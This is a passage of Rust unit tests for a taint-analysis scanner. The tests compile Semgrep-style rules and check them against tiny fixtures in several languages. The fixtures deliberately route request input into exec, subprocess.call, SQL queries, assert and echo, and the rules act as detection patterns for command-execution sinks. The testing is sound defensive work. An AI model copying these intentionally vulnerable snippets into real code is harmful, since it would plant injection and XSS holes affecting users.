          function ... (...,$FUNC,...) {
            ...
          }
      - focus-metavariable: $FUNC
pattern-sinks:
  - pattern: exec($CMD,...)
"#,
        );

        // A literal local, not a parameter, reaching exec(). No parameter flows
        // anywhere, so the any-parameter seed taints nothing relevant.
        let src = r#"
function run() {
  const cmd = "ls -la";
  exec(cmd);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a non-parameter constant must not fire, got {:?}",
            findings
        );
    }

    /// Python AWS-Lambda shape: `pattern: $EVENT` plus a `pattern-either:` of
    /// `pattern-inside:` handler signatures binding `$EVENT` as a parameter.
    /// A handler parameter flowing to `subprocess.call(...)` must fire.
    #[test]
    fn python_param_source_bare_pattern_inside_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-lambda-param
mode: taint
languages: [python]
severity: ERROR
message: "Lambda event reaches subprocess"
pattern-sources:
  - patterns:
      - pattern: $EVENT
      - pattern-inside: |
          def $HANDLER($EVENT, $CONTEXT):
            ...
pattern-sinks:
  - pattern: subprocess.call($X)
"#,
        );
        assert!(
            matches!(
                rule.spec.sources.as_slice(),
                [GenericMatcher::ParamName { names, .. }]
                    if names == &[crate::rules::taint_engine::ANY_PARAM_WILDCARD.to_string()]
            ),
            "expected wildcard ParamName source, got {:?}",
            rule.spec.sources
        );

        let src = r#"
def handler(event, context):
    cmd = event
    subprocess.call(cmd)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "handler param reaching subprocess.call must fire, got {:?}",
            findings
        );
    }

    /// Python near-miss: same rule, but the value reaching the sink is a
    /// hardcoded constant unrelated to any parameter — must not fire.
    #[test]
    fn python_param_source_constant_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-lambda-param-safe
mode: taint
languages: [python]
severity: ERROR
message: "Lambda event reaches subprocess"
pattern-sources:
  - patterns:
      - pattern: $EVENT
      - pattern-inside: |
          def $HANDLER($EVENT, $CONTEXT):
            ...
pattern-sinks:
  - pattern: subprocess.call($X)
"#,
        );

        let src = r#"
def handler(event, context):
    cmd = "echo hello"
    subprocess.call(cmd)
"#;
        let tree = parse_file(src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a hardcoded constant must not fire, got {:?}",
            findings
        );
    }

    /// A source `patterns:` block that names a focus metavariable which is NOT
    /// a parameter of any function-signature context must NOT compile to the
    /// any-parameter wildcard (guards against over-broad seeding).
    #[test]
    fn non_param_focus_block_is_not_treated_as_param_source() {
        let v: YamlValue = serde_yaml_ng::from_str(
            r#"
id: not-a-param-source
mode: taint
languages: [python]
severity: ERROR
message: m
pattern-sources:
  - patterns:
      - pattern: get_input($X)
      - focus-metavariable: $X
pattern-sinks:
  - pattern: eval($Y)
"#,
        )
        .unwrap();
        match parse_taint_rule(&v) {
            TaintRuleParse::Compiled(r) => {
                // The `get_input($X)` pattern is a Call source (expressible), so
                // the block compiles via graceful degradation — NOT to the
                // any-parameter wildcard.
                assert!(
                    !r.spec.sources.iter().any(|m| matches!(
                        m,
                        GenericMatcher::ParamName { names, .. }
                            if names.contains(&crate::rules::taint_engine::ANY_PARAM_WILDCARD.to_string())
                    )),
                    "a focus on a call metavar must not become an any-parameter source: {:?}",
                    r.spec.sources
                );
            }
            other => panic!(
                "expected compiled rule, got skip/nottaint: {:?}",
                matches!(other, TaintRuleParse::Skip(_))
            ),
        }
    }

    // ── Source-side `pattern-inside` enforcement (Pyramid shape) ─────────────
    //
    // These pin the source-side analog of the sink-side `pattern-inside`
    // filter: the taint SOURCE (an attribute read off the request parameter,
    // `$REQ.$FIELD`) is a source ONLY when it appears textually inside a
    // `@view_config`-decorated view function. The bridge threads the source
    // node's byte range onto the finding (`TaintInfo::source_range`) so the
    // post-filter can enforce the containment; without it the source would seed
    // every `.GET` read in the file (over-match), which is why the Pyramid rules
    // were skipped. The `probe_` name proves the compile shape; the `fires`
    // test proves the inside-vs-outside discrimination.

    const PYRAMID_SRC: &str = r#"
@view_config
def home_view(req):
    name = req.GET['name']
    return Response(name)

def plain_helper(req):
    name = req.GET['name']
    return Response(name)
"#;

    /// Compile-shape probe: an attribute-read source (`$REQ.GET`) gated by a
    /// source `pattern-inside` compiles to a `FieldName` source AND captures the
    /// `pattern-inside` into `insides.source` (NOT the `ParamName` wildcard path,
    /// which is reserved for a bare-metavar source). This is the piece that was
    /// "compiled but not enforced" before this change.
    #[test]
    fn source_side_pattern_inside_probe_compiles_field_source_and_captures_inside() {
        let rule = compiled(
            r#"
id: pyramid-like-probe
mode: taint
languages: [python]
severity: ERROR
message: "request attribute reaches Response"
pattern-sources:
  - patterns:
      - pattern: $REQ.GET
      - pattern-inside: |
          @view_config
          def $V(...):
              ...
pattern-sinks:
  - pattern: Response($X)
"#,
        );
        assert!(
            rule.spec
                .sources
                .iter()
                .any(|m| matches!(m, GenericMatcher::FieldName { field, .. } if field == "GET")),
            "expected a FieldName {{ GET }} source, got {:?}",
            rule.spec.sources
        );
        assert_eq!(
            rule.insides.source.len(),
            1,
            "the source-side pattern-inside must be captured into insides.source"
        );
    }

    /// The hard faithfulness gate: `req.GET['name']` INSIDE a `@view_config`
    /// view flows to `Response(...)` and FIRES; the identical `req.GET['name']`
    /// in a plain (non-`@view_config`) function does NOT — its source node is
    /// not inside the required region.
    #[test]
    fn source_side_pattern_inside_fires_inside_view_only() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: pyramid-like
mode: taint
languages: [python]
severity: ERROR
message: "request attribute reaches Response"
pattern-sources:
  - patterns:
      - pattern: $REQ.GET
      - pattern-inside: |
          @view_config
          def $V(...):
              ...
pattern-sinks:
  - pattern: Response($X)
"#,
        );

        let tree = parse_file(PYRAMID_SRC, Language::Python).expect("python fixture should parse");
        let findings = rule.check(PYRAMID_SRC, &tree);
        assert_eq!(
            findings.len(),
            1,
            "only the source inside the @view_config view may fire, got lines {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
        // The surviving finding is the `Response(name)` on line 5 (inside the
        // view), NOT the identical one on line 9 (inside plain_helper).
        assert_eq!(
            findings[0].line, 5,
            "the surviving finding must be inside the @view_config view (line 5), got {}",
            findings[0].line
        );
    }

    /// Control: WITHOUT the source-side `pattern-inside`, the SAME attribute-read
    /// source fires in BOTH functions — proving the discrimination above is due
    /// to the source-side enforcement, not some other narrowing.
    #[test]
    fn source_without_pattern_inside_fires_in_both_functions() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: pyramid-like-nogate
mode: taint
languages: [python]
severity: ERROR
message: "request attribute reaches Response"
pattern-sources:
  - pattern: $REQ.GET
pattern-sinks:
  - pattern: Response($X)
"#,
        );

        let tree = parse_file(PYRAMID_SRC, Language::Python).expect("python fixture should parse");
        let findings = rule.check(PYRAMID_SRC, &tree);
        assert_eq!(
            findings.len(),
            2,
            "without the source pattern-inside, both req.GET reads fire, got lines {:?}",
            findings.iter().map(|f| f.line).collect::<Vec<_>>()
        );
    }

    /// Java AWS-Lambda shape: `focus-metavariable: $EVENT` + a typed
    /// handler-signature `pattern`. A handler parameter flowing to a SQL string
    /// concat sink must fire; the wildcard seeds the typed parameter.
    #[test]
    fn java_param_source_focus_typed_signature_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-lambda-param
mode: taint
languages: [java]
severity: ERROR
message: "Handler param reaches SQL string"
pattern-sources:
  - patterns:
      - focus-metavariable: $EVENT
      - pattern: |
          $RT $HANDLER($TYPE $EVENT, Context $CTX) {
            ...
          }
pattern-sinks:
  - pattern: stmt.executeQuery($Q)
"#,
        );
        assert!(
            matches!(
                rule.spec.sources.as_slice(),
                [GenericMatcher::ParamName { names, .. }]
                    if names == &[crate::rules::taint_engine::ANY_PARAM_WILDCARD.to_string()]
            ),
            "expected wildcard ParamName source, got {:?}",
            rule.spec.sources
        );

        let src = r#"
class H {
  String handle(String event, Context ctx) {
    String q = event;
    return stmt.executeQuery(q);
  }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "handler param reaching executeQuery must fire, got {:?}",
            findings
        );
    }

    /// Java near-miss: a hardcoded literal (not a parameter) reaching the sink
    /// must not fire even though the wildcard seeds parameters.
    #[test]
    fn java_param_source_literal_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-lambda-param-safe
mode: taint
languages: [java]
severity: ERROR
message: "Handler param reaches SQL string"
pattern-sources:
  - patterns:
      - focus-metavariable: $EVENT
      - pattern: |
          $RT $HANDLER($TYPE $EVENT, Context $CTX) {
            ...
          }
pattern-sinks:
  - pattern: stmt.executeQuery($Q)
"#,
        );

        let src = r#"
class H {
  String handle(String event, Context ctx) {
    String q = "SELECT 1";
    return stmt.executeQuery(q);
  }
}
"#;
        let tree = parse_file(src, Language::Java).expect("java fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a hardcoded SQL literal must not fire, got {:?}",
            findings
        );
    }

    // ── Focus-on-call-argument SINK shape: focus-metavariable / bare-pattern
    //    focus + a call-context pattern-inside/pattern in a pattern-sinks block.
    //    Each test compiles through the SAME `parse_taint_rule` path the CLI
    //    uses, asserts the compiled SINK is a concrete `Call`/`MethodName`
    //    matcher (never an over-broad bare-node sink), then proves a tainted
    //    value reaching that call FIRES and a clean near-miss does NOT.

    /// PHP `assert-use` shape: `pattern: assert($SINK, ...)` + `pattern: $SINK`
    /// (the focus). Compiles to a concrete `Call { assert }` sink. A tainted
    /// `$_GET` value reaching `assert(...)` must fire.
    #[test]
    fn php_focus_call_sink_concrete_callee_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-assert-use
mode: taint
languages: [php]
severity: ERROR
message: "Tainted value reaches assert()"
pattern-sources:
  - pattern: $_GET
pattern-sinks:
  - patterns:
      - pattern: assert($SINK, ...)
      - pattern: $SINK
"#,
        );
        // The sink must be the concrete `assert` Call, not a dropped/empty sink.
        assert!(
            matches!(
                rule.spec.sinks.as_slice(),
                [GenericMatcher::Call { canonical, .. }] if canonical == "assert"
            ),
            "expected a concrete `assert` Call sink, got {:?}",
            rule.spec.sinks
        );

        let src = r#"<?php
function run() {
  $x = $_GET['code'];
  assert($x);
}
"#;
        let tree = parse_file(src, Language::Php).expect("php fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a tainted $_GET value reaching assert() must fire, got {:?}",
            findings
        );
    }

    /// PHP near-miss: the SAME `assert` sink, but the argument is a hardcoded
    /// literal (not tainted) — the call-argument taint gate means it must NOT
    /// fire. Proves the sink is not an over-broad "any assert call" matcher.
    #[test]
    fn php_focus_call_sink_untainted_arg_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: php-assert-use-safe
mode: taint
languages: [php]
severity: ERROR
message: "Tainted value reaches assert()"
pattern-sources:
  - pattern: $_GET
pattern-sinks:
  - patterns:
      - pattern: assert($SINK, ...)
      - pattern: $SINK
"#,
        );

        let src = r#"<?php
function run() {
  $x = "1 === 1";
  assert($x);
}
"#;
        let tree = parse_file(src, Language::Php).expect("php fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "an untainted literal in assert() must not fire, got {:?}",
            findings
        );
    }

    /// JS `node-mysql-sqli` shape: `focus-metavariable: $QUERY` + a
    /// `pattern-either:` of `pattern-inside: $POOL.query($QUERY, ...)` /
    /// `$POOL.execute($QUERY, ...)` call contexts. Compiles to `MethodName`
    /// sinks for `query`/`execute`. A tainted `req.body` reaching `.query(...)`
    /// must fire.
    #[test]
    fn js_focus_call_sink_method_name_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-mysql-sqli
mode: taint
languages: [javascript]
severity: ERROR
message: "Tainted value reaches a SQL query method"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - patterns:
      - focus-metavariable: $QUERY
      - pattern-either:
          - pattern-inside: $POOL.query($QUERY, ...)
          - pattern-inside: $POOL.execute($QUERY, ...)
"#,
        );
        // The sink must compile to concrete `query`/`execute` MethodName sinks.
        let mut methods: Vec<&str> = rule
            .spec
            .sinks
            .iter()
            .filter_map(|m| match m {
                GenericMatcher::MethodName { method, .. } => Some(method.as_str()),
                _ => None,
            })
            .collect();
        methods.sort_unstable();
        assert_eq!(
            methods,
            ["execute", "query"],
            "expected query/execute MethodName sinks, got {:?}",
            rule.spec.sinks
        );

        let src = r#"
function run(req, pool) {
  const q = req.body;
  pool.query(q);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a tainted req.body reaching pool.query() must fire, got {:?}",
            findings
        );
    }

    /// JS near-miss: the focused method-name sink (`query`/`execute`) but the
    /// call is `pool.format(q)` — a DIFFERENT method outside the pinned set —
    /// so the MethodName sinks must NOT fire. Proves the regex pin bounds the
    /// matcher to the listed methods.
    #[test]
    fn js_focus_call_sink_other_method_does_not_fire() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: js-mysql-sqli-safe
mode: taint
languages: [javascript]
severity: ERROR
message: "Tainted value reaches a SQL query method"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - patterns:
      - focus-metavariable: $QUERY
      - pattern-either:
          - pattern-inside: $POOL.query($QUERY, ...)
          - pattern-inside: $POOL.execute($QUERY, ...)
"#,
        );

        let src = r#"
function run(req, pool) {
  const q = req.body;
  pool.format(q);
}
"#;
        let tree = parse_file(src, Language::JavaScript).expect("js fixture should parse");
        let findings = rule.check(src, &tree);
        assert!(
            findings.is_empty(),
            "a tainted value reaching an unlisted method (.format) must not fire, got {:?}",
            findings
        );
    }

    /// A bounded-recognition guard: a `pattern-sinks` block whose call context
    /// has a free metavariable callee with NO pinning `metavariable-regex`
    /// (`$F($SINK, ...)`) must NOT compile to a sink (we never invent a callee
    /// name), so the rule is rejected rather than producing an any-call sink.
    #[test]
    fn unpinned_metavar_callee_sink_is_not_compiled() {
        let v: YamlValue = serde_yaml_ng::from_str(
            r#"
id: js-unpinned-callee
mode: taint
languages: [javascript]
severity: ERROR
message: "x"
pattern-sources:
  - pattern: $REQ.body
pattern-sinks:
  - patterns:
      - focus-metavariable: $SINK
      - pattern: $F($SINK, ...)
"#,
        )
        .unwrap();
        // No concrete callee/method can be derived, so the sink role empties and
        // the whole rule is skipped — never an over-broad any-call sink.
        assert!(
            matches!(parse_taint_rule(&v), TaintRuleParse::Skip(_)),
            "an unpinned metavariable callee must not compile to a sink"
        );
    }

    // ── Regex-bounded bare-metavariable callee SINK shape ───────────────────

    /// `$FUNCTION(...)` + `metavariable-regex` on `$FUNCTION` → `CallRegex`.
    /// A call whose callee matches the regex with a tainted argument FIRES;
    /// a call whose callee does NOT match the regex does NOT fire (proving the
    /// regex is enforced at match time, not dropped). Mirrors
    /// `md5-used-as-password` (`regex: (?i)(.*password.*)`).
    #[test]
    fn callregex_sink_fires_on_matching_callee_and_not_on_near_miss() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-password-sink
mode: taint
languages: [python]
severity: ERROR
message: "Tainted input reaches a *password* function"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - patterns:
      - pattern: $FUNCTION(...)
      - metavariable-regex:
          metavariable: $FUNCTION
          regex: (?i)(.*password.*)
"#,
        );

        // Callee `hash_password` matches `(?i).*password.*` → must fire.
        let fire_src = r#"
def handler():
    data = input()
    hash_password(data)
"#;
        let tree = parse_file(fire_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "a tainted value reaching hash_password() (callee matches the regex) must fire, got {:?}",
            findings
        );

        // Near-miss: callee `log_event` does NOT match the regex → must NOT fire.
        let miss_src = r#"
def handler():
    data = input()
    log_event(data)
"#;
        let tree = parse_file(miss_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "a tainted value reaching a callee NOT matching the regex must not fire, got {:?}",
            findings
        );
    }

    /// `$WRITER.$WRITE(...)` + `metavariable-regex` on `$WRITE` →
    /// `MethodNameRegex`. A method call whose method name matches the regex
    /// fires; a method whose name does NOT match does not. Mirrors
    /// `csv-writer-injection` (`regex: ^(writerow|writerows|writeheader)$`).
    #[test]
    fn methodnameregex_sink_fires_on_matching_method_and_not_on_near_miss() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-csv-writer
mode: taint
languages: [python]
severity: ERROR
message: "Tainted input reaches a csv writer row method"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - patterns:
      - pattern: $WRITER.$WRITE(...)
      - metavariable-regex:
          metavariable: $WRITE
          regex: ^(writerow|writerows|writeheader)$
"#,
        );

        // Method `writerow` matches the alternation → must fire.
        let fire_src = r#"
def handler(w):
    data = input()
    w.writerow(data)
"#;
        let tree = parse_file(fire_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted value into w.writerow() (method matches regex) must fire, got {:?}",
            findings
        );

        // Near-miss: method `flush` does NOT match the regex → must NOT fire.
        let miss_src = r#"
def handler(w):
    data = input()
    w.flush(data)
"#;
        let tree = parse_file(miss_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "tainted value into a method NOT matching the regex must not fire, got {:?}",
            findings
        );
    }

    /// `$EXEC(...)` + an alternation `metavariable-regex` with DOTTED names
    /// (`IO.popen`) → `CallRegex` tested against the full callee text. The
    /// bare `system(...)` callee fires; `puts(...)` (not listed) does not.
    /// Mirrors `dangerous-exec` (Ruby).
    #[test]
    fn callregex_sink_matches_dotted_alternative_callee_and_not_near_miss() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: ruby-dangerous-exec-min
mode: taint
languages: [ruby]
severity: ERROR
message: "Tainted input reaches a command-execution function"
pattern-sources:
  - pattern: gets
pattern-sinks:
  - patterns:
      - pattern: $EXEC(...)
      - metavariable-regex:
          metavariable: $EXEC
          regex: ^(system|exec|IO.popen)$
"#,
        );

        // `system(cmd)` callee matches the alternation → must fire.
        let fire_src = r#"
def handler
  cmd = gets
  system(cmd)
end
"#;
        let tree = parse_file(fire_src, Language::Ruby).expect("ruby fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted value into system() (callee matches regex) must fire, got {:?}",
            findings
        );

        // Near-miss: `puts(cmd)` is not in the alternation → must NOT fire.
        let miss_src = r#"
def handler
  cmd = gets
  puts(cmd)
end
"#;
        let tree = parse_file(miss_src, Language::Ruby).expect("ruby fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "tainted value into puts() (callee NOT matching the regex) must not fire, got {:?}",
            findings
        );
    }

    /// FP-safety guard: a bare-metavariable callee sink with NO pinning
    /// `metavariable-regex` must still compile to NOTHING (the sink role empties
    /// and the rule is skipped), so the regex-constrained path never relaxes the
    /// universal-callee refusal.
    #[test]
    fn bare_metavar_callee_sink_without_pin_still_compiles_to_nothing() {
        let v: YamlValue = serde_yaml_ng::from_str(
            r#"
id: py-unpinned-callee-sink
mode: taint
languages: [python]
severity: ERROR
message: "x"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - patterns:
      - pattern: $FUNCTION(...)
"#,
        )
        .unwrap();
        assert!(
            matches!(parse_taint_rule(&v), TaintRuleParse::Skip(_)),
            "a bare-metavar callee sink with no metavariable-regex pin must not compile"
        );
    }

    // ── Regex-bounded metavariable-RECEIVER SINK shape ──────────────────────

    /// `$OBJ.method(...)` + an anchored-alternation `metavariable-regex` on the
    /// RECEIVER `$OBJ` → enumerated concrete `Call { "<recv>.method" }` sinks.
    /// A tainted value reaching `db.execute(...)` (receiver in the alternation)
    /// FIRES; the same method on a receiver NOT in the alternation
    /// (`session.execute(...)`) does NOT fire — proving the receiver regex is
    /// enforced at match time instead of being dropped to a receiver-agnostic
    /// `MethodName`.
    #[test]
    fn receiver_regex_sink_fires_on_matching_receiver_and_not_on_near_miss() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-db-execute
mode: taint
languages: [python]
severity: ERROR
message: "Tainted input reaches a db/conn execute()"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - patterns:
      - pattern: $CONN.execute(...)
      - metavariable-regex:
          metavariable: $CONN
          regex: ^(db|conn)$
"#,
        );

        // Receiver `db` is in the alternation → must fire.
        let fire_src = r#"
def handler():
    data = input()
    db.execute(data)
"#;
        let tree = parse_file(fire_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(fire_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "tainted value into db.execute() (receiver matches the regex) must fire, got {:?}",
            findings
        );

        // Near-miss: receiver `session` is NOT in the alternation → must NOT fire.
        let miss_src = r#"
def handler():
    data = input()
    session.execute(data)
"#;
        let tree = parse_file(miss_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert!(
            findings.is_empty(),
            "tainted value into a receiver NOT matching the regex must not fire, got {:?}",
            findings
        );
    }

    /// Control: the SAME `$OBJ.method(...)` sink WITHOUT the receiver
    /// `metavariable-regex` compiles to a receiver-agnostic `MethodName` and
    /// therefore OVER-FIRES on the near-miss receiver — demonstrating the
    /// broadening that the receiver-regex pin removes.
    #[test]
    fn receiver_method_sink_without_pin_overfires_on_any_receiver() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: py-any-execute
mode: taint
languages: [python]
severity: ERROR
message: "Tainted input reaches any .execute()"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - pattern: $CONN.execute(...)
"#,
        );

        // Without the receiver pin, ANY `*.execute(...)` receiver fires — this is
        // the over-fire the pinned rule above suppresses.
        let miss_src = r#"
def handler():
    data = input()
    session.execute(data)
"#;
        let tree = parse_file(miss_src, Language::Python).expect("python fixture should parse");
        let findings = rule.check(miss_src, &tree);
        assert_eq!(
            findings.len(),
            1,
            "an unpinned `$OBJ.execute(...)` sink fires on any receiver (the broadening), got {:?}",
            findings
        );
    }

    /// A metavariable-receiver concrete-method sink whose receiver pin is a
    /// GENERAL (non-alternation) regex is NOT enumerable to exact callees, so
    /// the receiver-regex recognizer declines and the entry falls through to
    /// the broad `MethodName` extraction — i.e. it still compiles (no panic, no
    /// FP-unsafe relaxation), proving the recognizer is bounded to anchored
    /// alternations of plain identifiers.
    #[test]
    fn receiver_regex_general_regex_falls_through_to_method_name() {
        let g = compiled(
            r#"
id: py-general-receiver
mode: taint
languages: [python]
severity: ERROR
message: "x"
pattern-sources:
  - pattern: input(...)
pattern-sinks:
  - patterns:
      - pattern: $CONN.execute(...)
      - metavariable-regex:
          metavariable: $CONN
          regex: ^db.*$
"#,
        )
        .spec;
        // A general receiver regex cannot enumerate exact callees, so the sink
        // degrades to the receiver-agnostic `MethodName { execute }` rather than
        // an enumerated `Call`.
        assert_eq!(g.sinks.len(), 1, "expected a single fallback sink matcher");
        assert!(
            matches!(&g.sinks[0], GenericMatcher::MethodName { method, .. } if method == "execute"),
            "a general receiver regex must fall through to MethodName, got {:?}",
            g.sinks[0]
        );
    }

    // ── Paren-less "command" call → Call (PHP `echo`/`print`, Ruby command) ──

    #[test]
    fn command_call_whole_args_helpers() {
        // Accepted whole-args argument lists.
        assert!(is_whole_args_list("..."));
        assert!(is_whole_args_list("$X"));
        assert!(is_whole_args_list("$...VARS"));
        // Rejected: keyworded / positional-specific / empty.
        assert!(!is_whole_args_list("..., file: $X"));
        assert!(!is_whole_args_list("$X, $Y"));
        assert!(!is_whole_args_list("$...")); // no name after variadic marker
        assert!(!is_whole_args_list(""));

        // parse_command_call: identifier callee + whole-args → Some(callee).
        assert_eq!(parse_command_call("echo $...VARS"), Some("echo"));
        assert_eq!(parse_command_call("send_file ..."), Some("send_file"));
        assert_eq!(parse_command_call("redirect_to $URL"), Some("redirect_to"));
        // Rejected shapes.
        assert_eq!(parse_command_call("render ..., file: $X"), None);
        assert_eq!(parse_command_call("$X + $Y"), None); // callee not an identifier
        assert_eq!(parse_command_call("a.b ..."), None); // dotted callee
        assert_eq!(parse_command_call("echo"), None); // no args (bare ident)
    }

    #[test]
    fn php_echo_and_print_compile_to_call() {
        // `echo $...VARS;` and `print($...VARS);` (trailing `;` stripped for PHP)
        // compile to the native `echo` / `print` Call sinks the PHP engine matches.
        let m = compile_pattern("echo $...VARS;", MatcherRole::Sink, Language::Php).expect("echo");
        match m {
            GenericMatcher::Call { canonical, .. } => assert_eq!(canonical, "echo"),
            other => panic!("expected Call{{echo}}, got {other:?}"),
        }
        let m =
            compile_pattern("print($...VARS);", MatcherRole::Sink, Language::Php).expect("print");
        match m {
            GenericMatcher::Call { canonical, .. } => assert_eq!(canonical, "print"),
            other => panic!("expected Call{{print}}, got {other:?}"),
        }
    }

    #[test]
    fn command_call_is_gated_to_ruby_and_php() {
        // Paren-less command calls are only recognised for Ruby / PHP. A stray
        // `echo $...VARS` in a Python rule must NOT silently become a Call.
        assert!(compile_pattern("echo $...VARS", MatcherRole::Sink, Language::Python).is_none());
        assert!(compile_pattern("send_file ...", MatcherRole::Sink, Language::Go).is_none());
        // Ruby / PHP accept it.
        assert!(matches!(
            compile_pattern("send_file ...", MatcherRole::Sink, Language::Ruby),
            Some(GenericMatcher::Call { .. })
        ));
    }

    #[test]
    fn keyworded_command_call_is_rejected_not_overmatched() {
        // `render ..., file: $X` names a specific keyword arg position; compiling
        // it to a bare `Call { render }` would fire on argument positions the rule
        // never named. It must be refused (deferred), not over-matched.
        assert!(
            compile_pattern("render ..., file: $X", MatcherRole::Sink, Language::Ruby).is_none()
        );
    }

    #[test]
    fn php_echoed_request_rule_loads_and_fires() {
        use crate::engine::parser::parse_file;

        // Mirrors the registry rule `php/lang/security/injection/echoed-request`:
        // a `$_GET`/`$_REQUEST` source flowing into an `echo` reflected-XSS sink.
        let rule = compiled(
            r#"
id: echoed-request
mode: taint
languages: [php]
severity: ERROR
message: "reflected XSS via echo"
metadata:
  cwe: "CWE-79"
pattern-sources:
  - pattern: $_REQUEST
  - pattern: $_GET
  - pattern: $_POST
pattern-sinks:
  - pattern: echo $...VARS;
pattern-sanitizers:
  - pattern: htmlentities(...)
"#,
        );
        assert!(
            rule.spec.sinks.iter().any(
                |s| matches!(s, GenericMatcher::Call { canonical, .. } if canonical == "echo")
            ),
            "echo sink should compile to Call{{echo}}"
        );

        // Positive: tainted request value flows into echo → finding. (The PHP
        // engine analyses per-function, so the flow lives inside a function.)
        let vuln = "<?php\nfunction render() {\n  $x = $_GET['q'];\n  echo $x;\n}\n";
        let tree = parse_file(vuln, Language::Php).expect("PHP fixture parses");
        let findings = rule.check(vuln, &tree);
        assert!(
            !findings.is_empty(),
            "expected a finding for $_GET -> echo flow, got none"
        );

        // Near-miss: a constant echo (no tainted source) must stay silent.
        let safe = "<?php\nfunction render() {\n  echo \"static content\";\n}\n";
        let tree = parse_file(safe, Language::Php).expect("PHP fixture parses");
        assert!(
            rule.check(safe, &tree).is_empty(),
            "a constant echo must not fire"
        );

        // Near-miss: sanitized value must stay silent.
        let sanitized =
            "<?php\nfunction render() {\n  $x = htmlentities($_GET['q']);\n  echo $x;\n}\n";
        let tree = parse_file(sanitized, Language::Php).expect("PHP fixture parses");
        assert!(
            rule.check(sanitized, &tree).is_empty(),
            "an htmlentities()-sanitized value must not fire"
        );
    }

    #[test]
    fn ruby_send_file_rule_loads_and_fires() {
        use crate::engine::parser::parse_file;

        // Mirrors `ruby/rails/security/brakeman/check-send-file`: a `params[...]`
        // source flowing into a paren-less `send_file ...` sink.
        let rule = compiled(
            r#"
id: check-send-file
mode: taint
languages: [ruby]
severity: WARNING
message: "user input into send_file"
metadata:
  cwe: "CWE-73"
pattern-sources:
  - pattern-either:
      - pattern: params[...]
      - pattern: cookies[...]
pattern-sinks:
  - pattern: send_file ...
"#,
        );
        assert!(
            rule.spec.sinks.iter().any(
                |s| matches!(s, GenericMatcher::Call { canonical, .. } if canonical == "send_file")
            ),
            "send_file sink should compile to Call{{send_file}}"
        );

        // Positive: params[...] flows into send_file → finding.
        let vuln = "def show\n  path = params[:path]\n  send_file path\nend\n";
        let tree = parse_file(vuln, Language::Ruby).expect("Ruby fixture parses");
        assert!(
            !rule.check(vuln, &tree).is_empty(),
            "expected a finding for params -> send_file flow, got none"
        );

        // Near-miss: a constant argument must stay silent.
        let safe = "def show\n  send_file \"static.txt\"\nend\n";
        let tree = parse_file(safe, Language::Ruby).expect("Ruby fixture parses");
        assert!(
            rule.check(safe, &tree).is_empty(),
            "a constant send_file argument must not fire"
        );
    }

    // ── Java typed-metavariable source `(HttpServletRequest $REQ)` ──────────
    //
    // These exercise the whole `parse_taint_rule -> compiled() -> check()`
    // path: the typed-metavariable source must LOAD, FIRE when a variable of
    // the named type flows to a sink, and stay SILENT when the variable is a
    // different type (type discrimination — the faithfulness requirement).

    /// A `(HttpServletRequest $REQ)` source rule loads and fires on
    /// `void handler(HttpServletRequest req) { runtime.exec(req.getParameter("x")); }`.
    #[test]
    fn typed_metavar_source_loads_and_fires() {
        use crate::engine::parser::parse_file;

        let rule = compiled(
            r#"
id: java-typed-source
mode: taint
languages: [java]
severity: ERROR
message: "Untrusted HttpServletRequest reaches a command sink"
pattern-sources:
